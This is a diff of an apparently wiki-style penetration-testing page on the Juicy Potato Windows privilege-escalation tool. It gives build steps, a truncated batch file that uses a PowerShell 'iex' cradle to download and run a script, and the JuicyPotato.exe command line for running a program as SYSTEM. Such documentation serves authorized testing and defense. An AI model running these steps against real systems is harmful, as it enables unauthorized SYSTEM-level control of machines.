@@ -29,11 +29,15 @@ Juicy Potato is a privilege escalation tool which can be used to execute command
 
 Juicy Potato is a privilege escalation tool which can be used to execute commands as SYSTEM, if the user has SeImpersonate or SeAssignPrimaryToken privileges. This vulnerability works on many versions of Windows, though it has been patched in Server 2019 and newer builds of Windows 10.
 
+
+
 # Instructions
 
 ## Preparation
 
 As JuicyPotato is not always available as a pre-built binary, it may be necessary to build it from source using a Windows system and Visual Studio.
+
+
 
 1. Download JuicyPotato: [Download from GitHub](https://github.com/ohpe/juicy-potato)
 
@@ -42,6 +46,8 @@ As JuicyPotato is not always available as a pre-built binary, it may be necessar
 4. Build the solution  via "Build" > "Rebuild Solution"
 
 The final JuicyPotato.exe will be located in: \juicy-potato\JuicyPotato\Release\[ARCH]\JuicyPotato.exe
+
+
 
 ## Execution
 
@@ -55,14 +61,32 @@ The final JuicyPotato.exe will be located in: \juicy-potato\JuicyPotato\Release\
 
 - For example:
 
+
+
+
+
 **Code**: [[Local Service                 App ID              ]]
 
+
+
 3. Select a program or script which will be executed as SYSTEM. In this example, a simple .bat file  is executed, which downloads and runs a PowerShell script.
+
+
+
+
 
 **Code**: [[@ECHO OFF
 powershell.exe -ep bypass "iex(New-Objec]]
 
+
+
+
+
 4. Execute JuicyPotato.exe with the script and CLSID as arguments
+
+
+
+
 
 **Command** ([[Execute a Program with the Juicy Potato Exploit]]):
 
@@ -70,7 +94,15 @@ powershell.exe -ep bypass "iex(New-Objec]]
 JuicyPotato.exe -l 9999 -p "C:\$FULL_PATH\$_TARGET.exe" -t * -c "$_CLSID"
 ```
 
+
+
+
+
 Note: The port (9999) is chosen arbitrarily and can be changed if that port is in use.
+
+
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -86,3 +118,5 @@ Note: The port (9999) is chosen arbitrarily and can be changed if that port is i
 ## Commands Used
 
 - [[Execute a Program with the Juicy Potato Exploit]]
+
+
